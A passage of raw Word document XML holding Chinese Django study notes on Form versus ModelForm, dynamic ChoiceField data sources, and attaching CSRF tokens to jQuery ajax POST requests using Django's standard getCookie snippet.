        <w:t>的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195DD5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作用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD341A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对用户请求数据格式进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268B3E9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自动生成HTML标签</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46ED48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区别：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180802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Form，字段需要自己手写。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064899A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Form(Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3C11B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fields.IntegerField(.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8120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fields.CharField(.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBF37F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fields.EmailField(.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD34DE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fields.ImageField(.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2460A0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ModelForm，可以通过Meta进行定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EE224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MForm(ModelForm):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F200D94"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Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA623FC" w14:textId="7C3B044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 = UserInfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BF4FB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fields = "__all__"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D62F3A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82A4062"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应用：只要是客户端向服务端发送表单数据时，都可以进行使用，如：用户登录注册</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F4CCF7" w14:textId="7E96FBD1" w:rsidR="001E7149" w:rsidRPr="001A250B"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038</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的</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>组件中，如果字段中包含</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>choices</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>参数，请使用两种方式实现数据源实时更新（动态数据，而不是写死）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2567DFA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方式一：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>重写初始化方法</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，在构造方法中重新去数据库获取值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CFB94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UserForm(Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7B2C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ut_id = fields.ChoiceField(choices=())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6260C5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__init__(self, *args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357DB75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super(UserForm, self).__init__(*args, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C4285C"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self.fields['ut_id'].choices = models.UserType.objects.all().values_list('id', 'title')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F08B48" w14:textId="0BB5D54A"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方式二: </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字段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511C25D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UserForm(Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE49D6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ut_id = </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(queryset=models.UserType.objects.all())    　　# 从另一张依赖表中提取数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407701E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依赖表：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30920A4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UserType(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA171E7"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title = models.CharField(max_length=32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4820CAF1" w14:textId="3BF2B805" w:rsidR="001E7149" w:rsidRPr="00BF3003"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042</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基于</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使用</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ajax</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>发送</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求时，都可以使用哪种方法携带</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>csrf token</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D166468" w14:textId="77777777" w:rsidR="001E7149" w:rsidRDefault="00D96E02" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId47" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>https://www.cnblogs.com/wcwnina/p/9099561.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F16AFFD" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00002D25" w:rsidRDefault="00D96E02" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId48" w:history="1">
        <w:r w:rsidR="001E7149" w:rsidRPr="00002D25">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t xml:space="preserve">Django </w:t>
        </w:r>
        <w:r w:rsidR="001E7149" w:rsidRPr="00002D25">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>如何让</w:t>
        </w:r>
        <w:r w:rsidR="001E7149" w:rsidRPr="00002D25">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>ajax</w:t>
        </w:r>
        <w:r w:rsidR="001E7149" w:rsidRPr="00002D25">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>的</w:t>
        </w:r>
        <w:r w:rsidR="001E7149" w:rsidRPr="00002D25">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>POST</w:t>
        </w:r>
        <w:r w:rsidR="001E7149" w:rsidRPr="00002D25">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>方法带上</w:t>
        </w:r>
        <w:r w:rsidR="001E7149" w:rsidRPr="00002D25">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>CSRF</w:t>
        </w:r>
        <w:r w:rsidR="001E7149" w:rsidRPr="00002D25">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>令牌</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="346A5E51" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00002D25" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB1285B" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00002D25" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing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大家知道，在大前端领域，有一种叫做</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的东东，即</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>“Asynchronous Javascript And XML”</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（异步</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> JavaScript </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> XML</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>），它被用来在不刷新页面的情况下，提交和请求数据。</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>当没有</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;form&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元素时</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，也就是如果</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器接收的是一个通过</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发送过来的</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求的话，那么将很麻烦，何也？因为只要有</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;form&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元素就可以直接携带</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>{% csrf_token %}</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>令牌，但是，在没有</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;form&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元素情况下，</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没办法像</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;form&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元素那样携带</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>{% csrf_token %}</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>令牌。那怎么办呢？好办！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A663094" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00002D25" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法一（用在</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>js</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件中）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6291FB" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00002D25" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150"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在你的前端模版的</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代码处，添加下面的代码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0987198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8000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/****************** BEGIN ******************/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074C120D"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02D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>// 官方提供的js文件ajax携带CSRF令牌的方法(使用jQuery库)，参考官网https://docs.djangoproject.com/zh-hans/2.0/ref/csrf/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEB5DF6" w14:textId="61C96C49"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8000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>//***** 第一步：获取CSRF令牌 *****//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46805AE4"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getCookie(name) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452BC354"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cookieValue = </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF159F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(document.cookie &amp;&amp; document.cookie !== '') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58141FA8"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cookies = document.cookie.split(';');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170F5736"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for</w:t>
      </w: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i = 0; i &lt; cookies.length; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42916AAA"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cookie = jQuery.trim(cookies[i]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB5D08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8000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>// Does this cookie string begin with the name we want?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0CA90C"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(cookie.substring(0, name.length + 1) === (name + '=')) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49BE167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cookieValue = decodeURIComponent(cookie.substring(name.length + 1));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6FA1C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break</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019F0A8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4D634A03"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751B29AF"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1B06A7"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return</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookieValue;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDAF3A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6EC3FE0D"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csrftoken = getCookie('csrftoken');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C35133" w14:textId="0C5D34EC"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8000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>//***** 第二步：在ajax请求上设置CSRF令牌 *****//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670ED616"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csrfSafeMethod(method) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F37EB8D"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8000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>// 这些HTTP方法不要求携带CSRF令牌。test()是js正则表达式方法，若模板匹配成功，则返回true</w:t>
      </w:r>
    </w:p>
